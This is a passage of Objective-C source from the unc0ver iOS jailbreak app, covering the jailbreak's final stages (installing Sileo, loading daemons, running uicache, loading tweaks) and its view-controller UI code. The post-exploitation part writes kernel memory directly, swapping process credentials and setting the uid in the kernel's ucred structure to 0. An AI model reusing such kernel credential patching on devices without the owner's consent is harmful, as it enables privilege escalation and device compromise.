            SETMESSAGE(NSLocalizedString(@"Failed to disable Install Cydia.", nil));
            prefs.install_cydia = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_INSTALL_CYDIA] = @NO;
            }), message, true);
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully disabled Install Cydia.");
            
            INSERTSTATUS(NSLocalizedString(@"Installed Cydia.\n", nil));
        }
        if (prefs.install_sileo) {
            // These triggers cause loops
            if(pkgIsInstalled("us.diatr.sillyo")) {
                _assert(removePkg("us.diatr.sillyo", true), message, false);
            }
            
            // Download electrarepo64 Packages file
            LOG("Finding Sileo...");
            NSString *packagesurl =  [NSString stringWithFormat: @"https://electrarepo64.coolstar.org/Packages"];
            NSData *packagesData = [NSData dataWithContentsOfURL:[NSURL URLWithString:packagesurl]];
            [packagesData writeToFile:electraPackages atomically:YES];
            LOG("Sucessfully found Sileo!");
            
            // Download Sileo from electrarepo64
            NSString* fileContents = [NSString stringWithContentsOfFile:electraPackages encoding:NSUTF8StringEncoding error:nil];
            NSArray* lines = [fileContents componentsSeparatedByCharactersInSet: [NSCharacterSet newlineCharacterSet]];
            NSPredicate *predicate = [NSPredicate predicateWithFormat:
                                      @"SELF beginswith[c] 'Filename: debs/org.coolstar.sileo'"];
            NSArray *Filenameinarray = [lines filteredArrayUsingPredicate:predicate];
            NSString *Filename = [Filenameinarray description];
            NSString *urlEnd = [Filename stringByReplacingOccurrencesOfString:@"Filename: " withString:@""];
            NSArray *nospace = [urlEnd componentsSeparatedByCharactersInSet :[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            NSString *nospaceurlEnd = [nospace componentsJoinedByString:@""];
            NSString *url =  [NSString stringWithFormat: @"https://electrarepo64.coolstar.org/./%@",nospaceurlEnd];
            NSString *urlnoquote = [url stringByReplacingOccurrencesOfString:@"\"" withString:@""];
            NSString *urlclean = [urlnoquote stringByReplacingOccurrencesOfString:@"\"" withString:@""];
            NSString *urlnopar = [urlclean stringByReplacingOccurrencesOfString:@"\(" withString:@""];
            NSString *urlcleaner = [urlnopar stringByReplacingOccurrencesOfString:@")" withString:@""];
            // That shit was ugly, eh? It's late, maybe I'll clean it later.
            LOG(@"Downloading Sileo from %@",urlcleaner);
            NSData *debData = [NSData dataWithContentsOfURL:[NSURL URLWithString:urlcleaner]];
            [debData writeToFile:sileoDeb atomically:YES];
            LOG(@"Sucessfully downloaded Sileo to: %@",sileoDeb);
            
            // Install Sileo.
            LOG("Installing Sileo...");
            SETMESSAGE(NSLocalizedString(@"Failed to install Sileo.", nil));
            if(pkgIsInstalled("org.coolstar.Sileo")) {
                _assert(aptInstall(@[@"--reinstall", sileoDeb]), message, true);
            } else {
                _assert(aptInstall(@[sileoDeb]), message, true);
            }
            LOG("Successfully installed Sileo.");
            
            // Small compatibility layer to remove electrarepo
            LOG("Installing Sileo Compatibility Layer...");
            SETMESSAGE(NSLocalizedString(@"Failed to install Sileo Compatibility Layer.", nil));
            _assert(aptInstall(@[@"us.diatr.sillyo"]), message, true);
            LOG("Successfully installed Sileo Compatibility Layer.");
            
            // Disable Install Sileo.
            LOG("Disabling Install Sileo...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install Sileo.", nil));
            prefs.install_sileo = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_INSTALL_SILEO] = @NO;
            }), message, true);
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully disabled Install Sileo.");
            
            INSERTSTATUS(NSLocalizedString(@"Installed Sileo.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_daemons) {
            // Load Daemons.
            
            LOG("Loading Daemons...");
            SETMESSAGE(NSLocalizedString(@"Failed to load Daemons.", nil));
            system("echo 'really jailbroken';"
                   "shopt -s nullglob;"
                   "for a in /Library/LaunchDaemons/*.plist;"
                   "do echo loading $a;"
                   "launchctl load \"$a\" ;"
                   "done; ");
            // Substrate is already running, no need to run it again
            system("for file in /etc/rc.d/*; do "
                   "if [[ -x \"$file\" && \"$file\" != \"/etc/rc.d/substrate\" ]]; then "
                   "\"$file\";"
                   "fi;"
                   "done");
            LOG("Successfully loaded Daemons.");
            
            INSERTSTATUS(NSLocalizedString(@"Loaded Daemons.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.reset_cydia_cache) {
            // Reset Cydia cache.
            
            LOG("Resetting Cydia cache...");
            SETMESSAGE(NSLocalizedString(@"Failed to reset Cydia cache.", nil));
            _assert(clean_file("/var/mobile/Library/Cydia"), message, true);
            _assert(clean_file("/var/mobile/Library/Caches/com.saurik.Cydia"), message, true);
            prefs.reset_cydia_cache = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_RESET_CYDIA_CACHE] = @NO;
            }), message, true);
            LOG("Successfully reset Cydia cache.");
            
            INSERTSTATUS(NSLocalizedString(@"Reset Cydia Cache.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.run_uicache || !canOpen("cydia://")) {
            // Run uicache.
            
            LOG("Running uicache...");
            SETMESSAGE(NSLocalizedString(@"Failed to run uicache.", nil));
            _assert(runCommand("/usr/bin/uicache", NULL) == ERR_SUCCESS, message, true);
            prefs.run_uicache = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_REFRESH_ICON_CACHE] = @NO;
            }), message, true);
            LOG("Successfully ran uicache.");
            INSERTSTATUS(NSLocalizedString(@"Ran uicache.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (!(prefs.load_tweaks && prefs.reload_system_daemons)) {
            // Flush preference cache.
            
            LOG("Flushing preference cache...");
            SETMESSAGE(NSLocalizedString(@"Failed to flush preference cache.", nil));
            _assert(runCommand("/bin/launchctl", "stop", "com.apple.cfprefsd.xpc.daemon", NULL) == ERR_SUCCESS, message, true);
            LOG("Successfully flushed preference cache.");
            INSERTSTATUS(NSLocalizedString(@"Flushed preference cache.\n", nil));
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_tweaks) {
            // Load Tweaks.
            
            LOG("Loading Tweaks...");
            SETMESSAGE(NSLocalizedString(@"Failed to load tweaks.", nil));
            if (prefs.reload_system_daemons) {
                rv = system("nohup bash -c \""
                            "sleep 1 ;"
                            "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist && "
                            "ldrestart ;"
                            "launchctl load /System/Library/LaunchDaemons/com.apple.backboardd.plist"
                            "\" >/dev/null 2>&1 &");
            } else {
                rv = system("nohup bash -c \""
                            "sleep 1 ;"
                            "launchctl stop com.apple.mDNSResponder ;"
                            "launchctl stop com.apple.backboardd"
                            "\" >/dev/null 2>&1 &");
            }
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            LOG("Successfully loaded Tweaks.");
            
            INSERTSTATUS(NSLocalizedString(@"Loaded Tweaks.\n", nil));
        }
    }
    out:
    LOG("Deinitializing kexecute...");
    term_kexecute();
    LOG("Unplatformizing...");
    set_platform_binary(myProcAddr, false);
    set_cs_platform_binary(myProcAddr, false);
    LOG("Sandboxing...");
    myCredAddr = myOriginalCredAddr;
    _assert(give_creds_to_process_at_addr(myProcAddr, myCredAddr) == kernelCredAddr, message, true);
    LOG("Downgrading host port...");
    _assert(setuid(myUid) == ERR_SUCCESS, message, true);
    _assert(getuid() == myUid, message, true);
    LOG("Restoring shenanigans pointer...");
    WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
    LOG("Deallocating ports...");
    _assert(mach_port_deallocate(mach_task_self(), myHost) == KERN_SUCCESS, message, true);
    myHost = HOST_NULL;
    _assert(mach_port_deallocate(mach_task_self(), myOriginalHost) == KERN_SUCCESS, message, true);
    myOriginalHost = HOST_NULL;
    INSERTSTATUS(([NSString stringWithFormat:@"\nRead %zu bytes from kernel memory\nWrote %zu bytes to kernel memory\n", kreads, kwrites]));
    INSERTSTATUS(([NSString stringWithFormat:@"\nJailbroke in %ld seconds\n", time(NULL) - start_time]));
    STATUS(NSLocalizedString(@"Jailbroken", nil), false, false);
    showAlert(@"Jailbreak Completed", [NSString stringWithFormat:@"%@\n\n%@\n%@", NSLocalizedString(@"Jailbreak Completed with Status:", nil), status, NSLocalizedString((prefs.exploit == mach_swap_exploit || prefs.exploit == mach_swap_2_exploit) && !usedPersistedKernelTaskPort ? @"The device will now respring." : @"The app will now exit.", nil)], true, false);
    if (sharedController.canExit) {
        if ((prefs.exploit == mach_swap_exploit || prefs.exploit == mach_swap_2_exploit) && !usedPersistedKernelTaskPort) {
            WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL), ReadKernel64(kernelCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)));
            WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_UID), 0);
            _assert(restartSpringBoard(), message, true);
        } else {
            exit(EXIT_SUCCESS);
        }
    }
    sharedController.canExit = YES;
#undef INSERTSTATUS
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    STATUS(NSLocalizedString(@"Jailbreak", nil), false, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        _assert(bundledResources != nil, NSLocalizedString(@"Bundled Resources version missing.", nil), true);
        if (!jailbreakSupported()) {
            STATUS(NSLocalizedString(@"Unsupported", nil), false, true);
            return;
        }
        jailbreak();
    });
}

- (void)viewDidLoad {
    [super viewDidLoad];
    _canExit = YES;
    // Do any additional setup after loading the view, typically from a nib.
    if ([[NSUserDefaults standardUserDefaults] boolForKey:K_HIDE_LOG_WINDOW]) {
        _outputView.hidden = YES;
        _outputView = nil;
        _goButtonSpacing.constant += 80;
    }
    sharedController = self;
    bundledResources = bundledResourcesVersion();
    LOG("unc0ver Version: %@", appVersion());
    struct utsname kern = { 0 };
    uname(&kern);
    LOG("%s", kern.version);
    LOG("Bundled Resources Version: %@", bundledResources);
    if (jailbreakEnabled()) {
        STATUS(NSLocalizedString(@"Re-Jailbreak", nil), true, true);
    } else if (!jailbreakSupported()) {
        STATUS(NSLocalizedString(@"Unsupported", nil), false, true);
    }
    if (bundledResources == nil) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
            showAlert(NSLocalizedString(@"Error", nil), NSLocalizedString(@"Bundled Resources version is missing. This build is invalid.", nil), false, false);
        });
    }
    [self reloadData];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

- (void)reloadData {
    [self.TweakInjectionSwitch setOn:[[NSUserDefaults standardUserDefaults] boolForKey:K_TWEAK_INJECTION]];
    [self.installSileoSwitch setOn:[[NSUserDefaults standardUserDefaults] boolForKey:K_INSTALL_SILEO]];
}

- (IBAction)TweakInjectionSwitchTriggered:(id)sender {
    [[NSUserDefaults standardUserDefaults] setBool:[self.TweakInjectionSwitch isOn] forKey:K_TWEAK_INJECTION];
    [[NSUserDefaults standardUserDefaults] synchronize];
    [self reloadData];
}
- (IBAction)installSileoSwitchTriggered:(id)sender {
    [[NSUserDefaults standardUserDefaults] setBool:[self.installSileoSwitch isOn] forKey:K_INSTALL_SILEO];
    [[NSUserDefaults standardUserDefaults] synchronize];
    [self reloadData];
}

// This intentionally returns nil if called before it's been created by a proper init
+(JailbreakViewController *)sharedController {
    return sharedController;
}

-(void)updateOutputView {
    [self updateOutputViewFromQueue:@NO];
}

-(void)updateOutputViewFromQueue:(NSNumber*)fromQueue {
    static BOOL updateQueued = NO;
    static struct timeval last = {0,0};
    static dispatch_queue_t updateQueue;
    
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        updateQueue = dispatch_queue_create("updateView", NULL);
    });
    
    dispatch_async(updateQueue, ^{
        struct timeval now;
        
        if (fromQueue.boolValue) {
            updateQueued = NO;
        }
        
        if (updateQueued) {
            return;
        }
        
        if (gettimeofday(&now, NULL)) {
            LOG("gettimeofday failed");
            return;
        }
        
        uint64_t elapsed = (now.tv_sec - last.tv_sec) * 1000000 + now.tv_usec - last.tv_usec;
        // 30 FPS
        if (elapsed > 1000000/30) {
            updateQueued = NO;
            gettimeofday(&last, NULL);
            dispatch_async(dispatch_get_main_queue(), ^{
                self.outputView.text = output;
                [self.outputView scrollRangeToVisible:NSMakeRange(self.outputView.text.length, 0)];
            });
        } else {
            NSTimeInterval waitTime = ((1000000/30) - elapsed) / 1000000.0;
            updateQueued = YES;
            dispatch_async(dispatch_get_main_queue(), ^{
                [self performSelector:@selector(updateOutputViewFromQueue:) withObject:@YES afterDelay:waitTime];
            });
        }
    });
}

-(void)appendTextToOutput:(NSString *)text {
    if (_outputView == nil) {
        return;
    }
    static NSRegularExpression *remove = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        remove = [NSRegularExpression regularExpressionWithPattern:@"^\\d{4}-\\d{2}-\\d{2}\\s\\d{2}:\\d{2}:\\d{2}\\.\\d+[-\\d\\s]+\\S+\\[\\d+:\\d+\\]\\s+"
                                                           options:NSRegularExpressionAnchorsMatchLines error:nil];
        output = [NSMutableString new];
    });
    
    text = [remove stringByReplacingMatchesInString:text options:0 range:NSMakeRange(0, text.length) withTemplate:@""];
    
    @synchronized (output) {
        [output appendString:text];
    }
    [self updateOutputView];
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithCoder:aDecoder];
        }
    }
    self = sharedController;
    return self;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        }
    }
    self = sharedController;
    return self;
}

- (id)init {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super init];
        }
    }
    self = sharedController;
    return self;
}

@end

// Don't move this - it is at the bottom so that it will list the total number of upstages
int maxStage = __COUNTER__ - 1;
